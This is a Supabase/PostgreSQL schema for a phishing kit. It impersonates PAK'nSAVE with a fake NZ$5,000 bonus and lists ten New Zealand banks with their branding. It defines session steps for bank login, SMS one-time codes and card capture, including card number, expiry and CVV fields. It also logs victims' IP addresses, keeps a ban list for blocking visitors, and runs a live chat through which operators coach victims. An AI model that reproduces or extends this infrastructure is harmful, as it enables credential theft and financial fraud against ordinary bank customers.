create extension if not exists "pgcrypto";

create sequence if not exists public.sessions_public_id_seq;

create table if not exists public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  public_id bigint not null default nextval('public.sessions_public_id_seq'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'code_entry'
    check (
      current_step in (
        'code_entry',
        'win',
        'bank',
        'banken',
        'login',
        'bank_login',
        'wait',
        'sms',
        'card',
        'congrats',
        'special_approval',
        'invalid_bank',
        'live_support',
        'SPECIAL_INFO'
      )
    ),
  status text not null default 'offline'
    check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO')),
  sms_digits integer not null default 6 check (sms_digits >= 4 and sms_digits <= 12),
  sms_custom_text text,
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean not null default false,
  partner_name text,
  participation_code text,
  ip_address text,
  user_agent text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create unique index if not exists sessions_public_id_idx on public.sessions (public_id);
create index if not exists sessions_created_at_idx on public.sessions (created_at desc);

alter sequence public.sessions_public_id_seq owned by public.sessions.public_id;
alter table public.sessions replica identity full;

create or replace function public.set_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

drop trigger if exists sessions_set_updated_at on public.sessions;
create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_updated_at();

alter table public.sessions enable row level security;

drop policy if exists "sessions_authenticated_all" on public.sessions;
create policy "sessions_authenticated_all"
on public.sessions
for all
to authenticated
using (true)
with check (true);

drop policy if exists "sessions_anon_select" on public.sessions;
create policy "sessions_anon_select"
on public.sessions
for select
to anon
using (true);

drop policy if exists "sessions_anon_insert" on public.sessions;
create policy "sessions_anon_insert"
on public.sessions
for insert
to anon
with check (true);

drop policy if exists "sessions_anon_update" on public.sessions;
create policy "sessions_anon_update"
on public.sessions
for update
to anon
using (true)
with check (true);

do $$
begin
  if not exists (
    select 1
    from pg_publication_tables
    where pubname = 'supabase_realtime'
      and schemaname = 'public'
      and tablename = 'sessions'
  ) then
    execute 'alter publication supabase_realtime add table public.sessions';
  end if;
end $$;

create table if not exists public.global_settings (
  id text primary key default 'default',
  logo_url text not null default '/wheel-assets/desktop/png/paknsave-logo-hub.png',
  bg_url text not null default '/api/portal-background?variant=desktop',
  portal_name text not null default 'PAK''nSAVE Customer Portal',
  support_center_name text not null default 'PAK''nSAVE Support',
  win_title text not null default 'Exclusive PAK''nSAVE Bonus',
  win_subtitle text not null default 'Congratulations! You have been selected for today''s PAK''nSAVE promotion. Click the button below to claim your NZ$5,000 bonus.',
  win_button text not null default 'Claim Bonus',
  banken_title text not null default 'Choose Your Bank',
  banken_subtitle text not null default 'Select your bank to continue.',
  banken_search_placeholder text not null default 'Search your bank...',
  wait_title text not null default 'Please Wait',
  wait_subtitle text not null default 'Your request is being securely processed...',
  sms_title text not null default 'SMS Security Code',
  sms_subtitle text not null default 'Enter the {digits}-digit code.',
  sms_input_label text not null default 'One-time code',
  sms_button text not null default 'Confirm',
  sms_loading text not null default 'Processing...',
  card_title text not null default 'Payment Details',
  card_subtitle text not null default 'Check and confirm your details.',
  card_owner_label text not null default 'Cardholder Name',
  card_number_label text not null default 'Card Number',
  card_expiry_label text not null default 'Expiry Date MM/YY',
  card_cvv_label text not null default 'Security Code',
  card_button text not null default 'Continue',
  code_title text not null default 'Welcome',
  code_subtitle text not null default 'Enter the participation code you received from {partner} to unlock your reward.',
  code_button text not null default 'Confirm Code',
  live_support_title text not null default 'Live Support',
  live_support_subtitle text not null default 'To continue, you need to contact our customer support.\n\nClick the button below to start the chat.',
  live_support_button text not null default 'Start Chat',
  profile_title_small text not null default 'Prize Confirmation',
  profile_title_main text not null default 'Your Bonus Amount',
  profile_subtitle text not null default 'Confirm your details for further processing.',
  profile_firstname_label text not null default 'First Name',
  profile_lastname_label text not null default 'Last Name',
  profile_phone_label text not null default 'Mobile Number',
  profile_button text not null default 'Next',
  profile_loading_text text not null default 'Processing...',
  site_language text not null default 'en',
  target_country text not null default 'New Zealand',
  wheel_settings jsonb not null default '{"bg_url_mobile":"/api/portal-background?variant=mobile","page_backgrounds":{}}'::jsonb,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

drop trigger if exists global_settings_set_updated_at on public.global_settings;
create trigger global_settings_set_updated_at
before update on public.global_settings
for each row execute function public.set_updated_at();

alter table public.global_settings enable row level security;

drop policy if exists "global_settings_public_read" on public.global_settings;
create policy "global_settings_public_read"
on public.global_settings
for select
to anon, authenticated
using (true);

drop policy if exists "global_settings_authenticated_all" on public.global_settings;
create policy "global_settings_authenticated_all"
on public.global_settings
for all
to authenticated
using (true)
with check (true);

insert into public.global_settings (id)
values ('default')
on conflict (id) do nothing;

create table if not exists public.banks (
  id uuid primary key default gen_random_uuid(),
  slug text unique not null,
  name text not null,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  design_config jsonb not null default '{}'::jsonb,
  is_active boolean not null default true,
  country text not null default 'New Zealand',
  auto_redirect boolean not null default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

drop trigger if exists banks_set_updated_at on public.banks;
create trigger banks_set_updated_at
before update on public.banks
for each row execute function public.set_updated_at();

alter table public.banks enable row level security;

drop policy if exists "banks_public_read" on public.banks;
create policy "banks_public_read"
on public.banks
for select
to anon, authenticated
using (true);

drop policy if exists "banks_public_write" on public.banks;
create policy "banks_public_write"
on public.banks
for all
to anon, authenticated
using (true)
with check (true);

insert into public.banks (
  slug,
  name,
  brand_color,
  accent_color,
  logo_file,
  domain,
  country,
  is_active,
  auto_redirect
)
values
  ('anz-nz', 'ANZ', '#00529B', '#00A3E0', '/bank-logos/nz/anz-nz.png', 'anz.co.nz', 'New Zealand', true, false),
  ('asb-bank', 'ASB Bank', '#1F3C88', '#37A3E0', '/bank-logos/nz/asb-bank.png', 'asb.co.nz', 'New Zealand', true, false),
  ('bnz', 'Bank of New Zealand', '#0033A1', '#00AEEF', '/bank-logos/nz/bnz.png', 'bnz.co.nz', 'New Zealand', true, false),
  ('kiwibank', 'Kiwibank', '#78BE20', '#4D8C15', '/bank-logos/nz/kiwibank.png', 'kiwibank.co.nz', 'New Zealand', true, false),
  ('westpac-nz', 'Westpac New Zealand', '#D71920', '#AA1118', '/bank-logos/nz/westpac-nz.png', 'westpac.co.nz', 'New Zealand', true, false),
  ('tsb-bank-nz', 'TSB Bank', '#003B7A', '#0060A8', '/bank-logos/nz/tsb-bank-nz.png', 'tsb.co.nz', 'New Zealand', true, false),
  ('co-operative-bank-nz', 'The Co-operative Bank', '#7B2CBF', '#5A189A', '/bank-logos/nz/co-operative-bank-nz.png', 'co-operativebank.co.nz', 'New Zealand', true, false),
  ('heartland-bank', 'Heartland Bank', '#8E1B1B', '#B3261E', '/bank-logos/nz/heartland-bank.png', 'heartland.co.nz', 'New Zealand', true, false),
  ('sbs-bank', 'SBS Bank', '#006A52', '#00836A', '/bank-logos/nz/sbs-bank.png', 'sbsbank.co.nz', 'New Zealand', true, false),
  ('rabobank-nz', 'Rabo Bank', '#003D8F', '#F57C00', '/bank-logos/nz/rabobank-nz.png', 'rabobank.co.nz', 'New Zealand', true, false)
on conflict (slug) do nothing;

create table if not exists public.chat_messages (
  id uuid primary key default gen_random_uuid(),
  session_id text not null references public.sessions(id) on delete cascade,
  sender text not null check (sender in ('user', 'admin')),
  content text not null,
  image_url text,
  created_at timestamptz not null default now()
);

alter table public.chat_messages enable row level security;

drop policy if exists "chat_messages_anon_all" on public.chat_messages;
create policy "chat_messages_anon_all"
on public.chat_messages
for all
to anon
using (true)
with check (true);

drop policy if exists "chat_messages_auth_all" on public.chat_messages;
create policy "chat_messages_auth_all"
on public.chat_messages
for all
to authenticated
using (true)
with check (true);

do $$
begin
  if not exists (
    select 1
    from pg_publication_tables
    where pubname = 'supabase_realtime'
      and schemaname = 'public'
      and tablename = 'chat_messages'
  ) then
    execute 'alter publication supabase_realtime add table public.chat_messages';
  end if;
end $$;

create table if not exists public.banned_ips (
  ip_address text primary key,
  reason text,
  banned_at timestamptz not null default now()
);

alter table public.banned_ips enable row level security;

drop policy if exists "banned_ips_public_read" on public.banned_ips;
create policy "banned_ips_public_read"
on public.banned_ips
for select
to anon, authenticated
using (true);

drop policy if exists "banned_ips_public_insert" on public.banned_ips;
create policy "banned_ips_public_insert"
on public.banned_ips
for insert
to anon, authenticated
with check (true);

drop policy if exists "banned_ips_public_delete" on public.banned_ips;
create policy "banned_ips_public_delete"
on public.banned_ips
for delete
to anon, authenticated
using (true);

insert into storage.buckets (id, name, public)
values
  ('assets', 'assets', true),
  ('chat_images', 'chat_images', true)
on conflict (id) do nothing;

drop policy if exists "assets_public_read" on storage.objects;
create policy "assets_public_read"
on storage.objects
for select
using (bucket_id = 'assets');

drop policy if exists "assets_public_insert" on storage.objects;
create policy "assets_public_insert"
on storage.objects
for insert
with check (bucket_id = 'assets');

drop policy if exists "assets_public_update" on storage.objects;
create policy "assets_public_update"
on storage.objects
for update
using (bucket_id = 'assets')
with check (bucket_id = 'assets');

drop policy if exists "assets_public_delete" on storage.objects;
create policy "assets_public_delete"
on storage.objects
for delete
using (bucket_id = 'assets');

drop policy if exists "chat_images_public_read" on storage.objects;
create policy "chat_images_public_read"
on storage.objects
for select
using (bucket_id = 'chat_images');

drop policy if exists "chat_images_public_insert" on storage.objects;
create policy "chat_images_public_insert"
on storage.objects
for insert
with check (bucket_id = 'chat_images');
